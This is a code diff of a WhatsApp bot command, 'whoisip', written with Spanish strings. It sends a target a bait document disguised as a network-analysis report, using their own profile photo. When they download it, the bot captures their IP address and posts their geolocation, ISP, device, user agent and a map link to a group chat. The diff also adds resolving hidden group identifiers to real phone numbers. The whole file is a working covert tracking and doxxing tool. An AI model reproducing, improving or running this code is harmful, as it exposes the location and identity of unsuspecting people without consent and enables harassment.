@@ -1,18 +1,21 @@
 import { randomBytes } from "node:crypto";
 import { readFile } from "node:fs/promises";
+import { existsSync } from "node:fs";
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
 import {
   buildDocumentMessage,
+  closeSession,
   createSession,
-  TRAP_BASE_URL,
+  hasActiveSession,
   TRAP_TTL_MS,
   type TrapHit,
   type TrapSession,
 } from "../../core/ipTrap.ts";
 
-const FALLBACK_JPG =
-  "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
+const PLACEHOLDER = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";
+
+const FALLBACKS = ["assets/img/whoisip.jpg", "assets/img/default.jpg", "assets/img/bot.jpg"];
 
 const flagOf = (cc?: string) =>
   cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️";
@@ -23,7 +26,6 @@ function deviceOf(ua: string) {
   if (/windows/i.test(ua)) return "🖥️ Windows";
   if (/mac os|macintosh/i.test(ua)) return "🖥️ macOS";
   if (/linux/i.test(ua)) return "🐧 Linux";
-  if (/whatsapp/i.test(ua)) return "💬 Cliente WhatsApp";
   return "❔ Desconocido";
 }
 
@@ -43,9 +45,7 @@ async function sendReport(sock: any, s: TrapSession, hit: TrapHit, idx: number) 
   const tipo = g?.proxy ? "🛡️ Proxy / VPN" : g?.mobile ? "📶 Red móvil" : g?.hosting ? "🖧 Hosting" : "🌐 Red fija / otra";
 
   const lines = [
-    idx === 0
-      ? `📡 *${fytBold("IP CAPTURADA")}*`
-      : `📡 *${fytBold(`IP ADICIONAL #${idx + 1}`)}*`,
+    idx === 0 ? `📡 *${fytBold("IP CAPTURADA")}*` : `📡 *${fytBold(`IP ADICIONAL #${idx + 1}`)}*`,
     ``,
     `╭─〔 🎯 *OBJETIVO* 〕`,
     `┃ 👤 *Nombre:* ${s.pushName}`,
@@ -64,21 +64,19 @@ async function sendReport(sock: any, s: TrapSession, hit: TrapHit, idx: number) 
     `┃ 🔢 *ASN:* ${g?.asn ?? "N/D"}`,
     `┃ 🕒 *TZ:* \`${g?.tz ?? "N/D"}\``,
     `┃ ⌚ *Hora local:* ${localTime}`,
-    ...(g?.lat && g?.lon
-      ? [`┃ 📍 *Mapa:* https://www.google.com/maps?q=${g.lat},${g.lon}`]
-      : []),
+    ...(g?.lat && g?.lon ? [`┃ 📍 *Mapa:* https://www.google.com/maps?q=${g.lat},${g.lon}`] : []),
     `╰─────────────────────`,
     ``,
     `╭─〔 🧾 *CLIENTE* 〕`,
     `┃ 🖥️ *Dispositivo:* ${deviceOf(hit.ua)}`,
-    `┃ 🏷️ *UA:* ${hit.ua.slice(0, 160)}`,
+    `┃ 🏷️ *UA:* ${hit.ua.slice(0, 150)}`,
     `┃ 🕐 *Capturado:* ${new Date(hit.at).toLocaleString("es-CO")}`,
     `╰─────────────────────`,
     ``,
     g?.proxy || g?.hosting
       ? `⚠️ IP de proxy/VPN o datacenter: la ubicación puede no ser la real.`
       : g?.mobile
-        ? `ℹ️ IP de operador móvil: ciudad aproximada (NAT del carrier).`
+        ? `ℹ️ IP de operador móvil: ciudad aproximada por NAT del carrier.`
         : `ℹ️ Geolocalización a nivel de ciudad por base de datos de IP.`,
   ];
 
@@ -88,14 +86,10 @@ async function sendReport(sock: any, s: TrapSession, hit: TrapHit, idx: number) 
 export default {
   name: ["whoisip", "ipgrab", "rastrearip"],
   category: "group",
-  description: "Captura la IP del objetivo con un documento trampa y reporta la geolocalización al grupo.",
+  description: "Captura la IP del objetivo con un documento trampa y reporta su geolocalización al grupo.",
   groupOnly: false,
   async run(ctx: CommandContext) {
-    const { reply, react, msg, args, sock, from } = ctx;
-
-    if (!TRAP_BASE_URL) {
-      return reply("⚠️ Falta la variable de entorno *TRAP_BASE_URL* (URL pública HTTPS de este servidor).");
-    }
+    const { reply, react, msg, args, sock, from, groupMeta } = ctx;
 
     const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
     let raw = "";
@@ -104,77 +98,127 @@ export default {
     else if (contextInfo?.participant) raw = contextInfo.participant;
     else if (args.length) raw = args.join("");
 
-    const digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
-    if (!digits || digits.length < 7) {
-      return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
+    if (!raw) return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
+
+    if (hasActiveSession(from)) {
+      return reply("⏳ Ya hay un *whoisIP* activo en este chat. Espera a que expire.");
     }
 
-    const targetJid = `${digits}@s.whatsapp.net`;
+    const isLid = raw.endsWith("@lid");
+    let digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
+    let targetJid = isLid ? `${digits}@lid` : `${digits}@s.whatsapp.net`;
+
+    // Si es LID, intenta resolver el número real desde la caché del grupo
+    const participant = groupMeta?.participants?.find((p: any) => {
+      const pLid = String(p.lid ?? "").split("@")[0].split(":")[0];
+      const pId = String(p.id ?? "").split("@")[0].split(":")[0];
+      return pLid === digits || pId === digits;
+    }) as any;
+
+    const realPhone = participant?.phoneNumber
+      ? String(participant.phoneNumber).replace(/\D/g, "")
+      : !isLid
+        ? digits
+        : "";
+
+    if (realPhone) {
+      digits = realPhone;
+      targetJid = `${realPhone}@s.whatsapp.net`;
+    }
+
+    if (!digits || digits.length < 7) {
+      return reply("⚠️ No pude resolver un número válido. Escríbelo manual: *whoisIP +573118353868*.");
+    }
 
     await react("🔎").catch(() => undefined);
 
-    const check = await sock.onWhatsApp(targetJid).catch(() => null);
-    if (!check?.[0]?.exists) {
-      await react("❌").catch(() => undefined);
-      return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
+    if (!isLid) {
+      const check = await sock.onWhatsApp(targetJid).catch(() => null);
+      if (!check?.[0]?.exists) {
+        await react("❌").catch(() => undefined);
+        return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
+      }
     }
 
     const pushName =
-      (await sock.fetchStatus?.(targetJid).catch(() => null)) ??
-      (msg as any).pushName ??
-      "Desconocido";
+      participant?.name ||
+      participant?.notify ||
+      (contextInfo?.participant === targetJid ? msg.pushName : null) ||
+      `+${digits}`;
 
-    // Foto de perfil como cebo
+    // Cebo: foto de perfil
     let plain: Buffer | null = null;
     try {
       const pp = await sock.profilePictureUrl(targetJid, "image");
       if (pp) {
-        const r = await fetch(pp, { signal: AbortSignal.timeout(8000) });
+        const r = await fetch(pp, { signal: AbortSignal.timeout(9000) });
         if (r.ok) plain = Buffer.from(await r.arrayBuffer());
       }
     } catch {}
 
     if (!plain) {
-      try {
-        plain = await readFile("assets/whoisip.jpg");
-      } catch {
-        plain = Buffer.from(FALLBACK_JPG, "base64");
+      const local = FALLBACKS.find((p) => existsSync(p));
+      if (local) {
+        try {
+          plain = await readFile(local);
+        } catch {}
       }
     }
 
-    const session = createSession({
-      plain,
-      fileName: `foto_${digits.slice(-4)}.jpg`,
-      targetJid,
-      targetPhone: digits,
-      chatJid: from,
-      pushName: String(pushName ?? "Desconocido"),
-      onHit: async (s, hit) => {
-        const idx = s.hits.findIndex((h) => h.ip === hit.ip);
-        await sendReport(sock, s, hit, idx < 0 ? s.hits.length : idx);
-      },
-      onExpire: async (s) => {
-        await sock
-          .sendMessage(s.chatJid, {
-            text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó el archivo en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
-          })
-          .catch(() => undefined);
-      },
-    });
+    if (!plain) {
+      try {
+        const r = await fetch(
+          `https://ui-avatars.com/api/?name=${encodeURIComponent(pushName)}&size=640&format=jpg&background=0f172a&color=ffffff`,
+          { signal: AbortSignal.timeout(9000) }
+        );
+        if (r.ok) plain = Buffer.from(await r.arrayBuffer());
+      } catch {}
+    }
+
+    if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
+
+    let session: TrapSession;
+    try {
+      session = await createSession({
+        plain,
+        fileName: `foto_${digits.slice(-4)}.jpg`,
+        targetJid,
+        targetPhone: digits,
+        chatJid: from,
+        pushName: String(pushName),
+        onHit: (s, hit, idx) => sendReport(sock, s, hit, idx),
+        onExpire: async (s) => {
+          await sock
+            .sendMessage(s.chatJid, {
+              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó el archivo en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
+            })
+            .catch(() => undefined);
+        },
+      });
+    } catch (e: any) {
+      await react("❌").catch(() => undefined);
+      return reply(`❌ No pude abrir el túnel público:\n${e?.message ?? e}`);
+    }
 
     const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
-    const caption =
-      `🔎 *${fytBold("Análisis de red")}*\n\n` +
-      `Toca *Descargar* para generar el reporte.\n` +
-      `\`+${digits}\``;
 
-    const docMsg = buildDocumentMessage(session, caption, {
-      stanzaId: msg.key.id,
-      participant: msg.key.participant ?? targetJid,
-      remoteJid: from,
-    });
+    const docMsg = buildDocumentMessage(
+      session,
+      `🔎 *${fytBold("Análisis de red")}*\n\nToca *Descargar* para generar el reporte.\n\`+${digits}\``,
+      {
+        stanzaId: msg.key.id,
+        participant: msg.key.participant ?? msg.key.remoteJid ?? undefined,
+        remoteJid: from,
+      }
+    );
 
-    await sock.relayMessage(from, docMsg, { messageId });
-    await react("📡").catch(() => undefined);
+    try {
+      await sock.relayMessage(from, docMsg, { messageId });
+      await react("📡").catch(() => undefined);
+    } catch (e: any) {
+      closeSession(session);
+      await react("❌").catch(() => undefined);
+      return reply(`❌ Error al enviar el documento: ${e?.message ?? e}`);
+    }
   },
 };
